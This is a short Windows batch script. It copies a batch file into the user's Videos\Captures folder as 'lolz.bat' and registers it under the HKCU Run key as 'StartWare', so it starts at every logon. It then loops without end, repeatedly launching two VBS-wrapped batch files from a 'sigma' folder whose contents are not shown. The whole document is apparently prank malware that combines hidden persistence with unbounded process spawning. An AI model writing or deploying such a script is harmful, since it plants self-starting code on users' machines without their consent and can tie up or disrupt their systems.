@echo off
copy %PUBLIC%\sigma\startup.bat %USERPROFILE%\Videos\Captures\lolz.bat
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "StartWare" /t REG_SZ /d "%USERPROFILE%\Videos\Captures\lolz.bat" /f

:loop
wscript %PUBLIC%\sigma\file.vbs %PUBLIC%\sigma\file.bat
wscript %PUBLIC%\sigma\file.vbs %PUBLIC%\sigma\copy.bat
goto loop
